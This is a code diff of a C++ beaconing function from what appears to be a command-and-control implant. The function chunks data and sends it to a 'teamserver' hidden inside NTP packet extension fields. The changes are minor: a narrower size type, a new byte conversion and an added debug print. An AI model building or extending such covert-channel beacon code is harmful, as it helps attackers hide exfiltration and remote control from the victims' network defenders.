@@ -38,7 +38,7 @@ std::vector<uint8_t> sendBeaconDataToTeamserver(std::vector<uint8_t> data, std::
 	std::cout << "======================" << std::endl;
 	//packetDebugger(data);
 	//1. Calculate size of data, (data.size()), then send a sizePacket to server. If OK, continue
-	uint64_t dataSize = data.size(); //uint64_t acn hold a size of like 18 Quadrillion bytes (18 exabytes). I hope someone isn't sending that much data but who knows. Rather be safe than sorry.
+	uint32_t dataSize = data.size(); //uint64_t acn hold a size of like 18 Quadrillion bytes (18 exabytes). I hope someone isn't sending that much data but who knows. Rather be safe than sorry.
 	std::vector<uint8_t> responseDataBuffer = {};
 	int amountOfChunks = (dataSize + Chunk::maxChunkSize - 1) / Chunk::maxChunkSize; //gives you one extra chunk for remainder
 
@@ -50,7 +50,7 @@ std::vector<uint8_t> sendBeaconDataToTeamserver(std::vector<uint8_t> data, std::
 	Need to send a size message to tell the server that the total message length will be X size, for chunking purposes. 
 	*/
 	auto packetToNotifyServerOfSize = NTPPacket();
-	auto incomingSize = size_tToBytes(dataSize);
+	auto incomingSize = uint32ToBytes(dataSize);
 	//std::vector<uint8_t> emptyClientId = { 0xFF, 0xFF, 0xFF, 0xFF };
 
 	packetToNotifyServerOfSize.addExtensionField(
@@ -60,6 +60,7 @@ std::vector<uint8_t> sendBeaconDataToTeamserver(std::vector<uint8_t> data, std::
 	);
 	std::cout << "[?] Sending size packet " << std::endl;
 	std::vector < uint8_t> packetToNotifyServerOfSizeBytes = packetToNotifyServerOfSize.getPacket();
+	printHexVectorPacket(packetToNotifyServerOfSizeBytes);
 	std::vector<uint8_t> response = sendChunk(packetToNotifyServerOfSizeBytes);
 	
 	//server should now know that the size is size of data to be sent
@@ -67,7 +68,7 @@ std::vector<uint8_t> sendBeaconDataToTeamserver(std::vector<uint8_t> data, std::
 	// Loop over each chunk index
 	for (int i = 0; i < amountOfChunks; ++i) { //++i as we want to get the last chunk
 		size_t start = i * Chunk::maxChunkSize; //get how far into the data we need to be to get the chunk
-		size_t end = std::min(start + Chunk::maxChunkSize, dataSize); //gets the smaller of the 2, whether that be dataSize, or start+maxChunkSize. TLDR, prevents trying to read outside of func arg provided data buffer (which is only so big)
+		size_t end = std::min(start + Chunk::maxChunkSize, static_cast<size_t>(dataSize));
 
 		std::vector<uint8_t> chunkData(data.begin() + start, data.begin() + end);
 
